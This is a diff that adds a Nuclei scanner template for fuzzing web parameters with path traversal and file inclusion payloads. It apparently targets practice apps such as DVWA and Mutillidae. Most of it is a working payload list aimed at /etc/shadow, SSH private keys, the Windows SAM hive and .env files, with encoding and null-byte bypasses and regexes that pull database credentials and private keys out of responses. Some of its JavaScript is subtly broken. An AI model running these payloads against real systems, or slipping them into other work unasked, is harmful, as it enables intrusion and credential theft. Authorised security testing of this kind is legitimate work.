@@ -1,0 +1,136 @@
+id: http-path-traversal-fuzz
+
+info:
+  name: HTTP Path Traversal fuzzing
+  author: trandieuquynh
+  severity: high
+  description: Gửi các yêu cầu HTTP GET tới một endpoint của máy chủ web, với tham số file được thêm vào URL. Thử fuzzing bằng cách thay đổi giá trị của file với các payloads phổ biến của Path Traversal.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - 
+  tags: fuzzing, http, traversal
+
+javascript:
+  - pre-condition: |
+      isPortOpen(Host, "80") || isPortOpen(Host, "8080");
+    code: |
+      let http = require("nuclei/http");
+      let ports = ["80", "8080"]
+      let endpoints = [
+      "/dvwa/vulnerabilities/fi/?{{param}}={{fuzz}}",
+      "/mutillidae/index.php?{{param}}={{fuzz}}",
+      "/?{{param}}={{fuzz}}"
+      ];
+      let responses=[];
+      for (let endpoint of endpoints) {
+        responses.push(http.Get(Host + endpoint));
+      }
+      to_json(responses);
+
+    args:
+      Host: "{{Host}}"
+      fuzz: "{{fuzz}}"
+      param: 
+        - "page"
+        - "file" 
+        - "path" 
+        - "dir"
+        - "document"
+        - "include"
+
+    payloads:
+      fuzz: 
+        # Basic traversal
+        - "../"
+        - "../../"
+        - "../../../"
+        - "../../../../"
+        - "../../../../../"
+        - "../../../../../../"
+        - "....//"
+        - "..././"
+        - "./../"   
+
+        # Linux/Unix sensitive files
+        - "/etc/passwd"
+        - "/etc/shadow"
+        - "/etc/hosts"
+        - "/etc/group"
+        - "/proc/self/environ"
+        - "/proc/self/status"
+        - "/root/.bashrc"
+        - "/home/*/.ssh/id_rsa"
+        - "/var/log/apache2/access.log"
+        - "/var/www/html/config.php"
+    
+        # Windows sensitive files
+        - "\\..\\"
+        - "\\..\\..\\"
+        - "\\..\\..\\..\\"
+        - "C:\\Windows\\win.ini"
+        - "C:\\Windows\\System32\\config\\SAM"
+        - "C:\\Windows\\System32\\drivers\\etc\\hosts"
+        - "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\startup.bat"
+        - "C:\\inetpub\\wwwroot\\web.config"
+    
+        # URL encoded payloads
+        - "%2e%2e%2f"
+        - "%2e%2e%5c"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f"
+        - "%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"
+        - "%252e%252e%252f" # Double URL encoding
+        - "%c0%ae%c0%ae%2f"
+    
+        # Unicode encoded payloads
+        - "%u002e%u002e%u002f"
+        - "%u002e%u002e%u005c"
+        - "..%u2215"
+        - "..%u2216"
+    
+        # Mixed encoding and bypass
+        - "..././..././"
+        - "....////"
+        - "/././../"
+        - "/%2e%2e/%2e%2e/"
+        - "/%252e%252e/%252e%252e/"
+        - "..%2f..%2f..%2f"
+    
+        # Null byte injection
+        - "../../etc/passwd%00"
+        - "../../windows/win.ini%00"
+    
+        # Common configuration files
+        - "/.env"
+        - "/.git/config"
+        - "/WEB-INF/web.xml"
+        - "/config/database.yml"
+        - "/wp-config.php"
+        - "/.htaccess"
+
+        # Existing payloads...
+        - "../../etc/passwd"
+        - "../../proc/self/environ"
+
+        # LFI-specific
+        - "php://filter/convert.base64-encode/resource=index.php"
+        - "/proc/self/fd/0"
+        - "/var/log/apache2/error.log"
+    attack: batteringram
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, 'root:') || contains(body, '[files]') || contains(body, 'Windows Directory') || contains(body, 'DB_PASSWORD') || contains(body, 'SSH_PRIVATE_KEY') || contains(body, '<?php') || contains(body, 'apache2')"
+          - "status == 200 || status == 403"
+        condition: and
+
+    extractors:
+      - type: regex
+        regex:
+          - "root:[^:]+:[0-9]+:[0-9]+:[^:]+:/[^:]+:/[^:]+"
+          - "DB_[A-Z]+=[^\n]+" # Extract database credentials
+          - "BEGIN RSA PRIVATE KEY.*END RSA PRIVATE KEY" # Extract SSH keys
+      - type: json 
+        json:
+          - ".body"
+
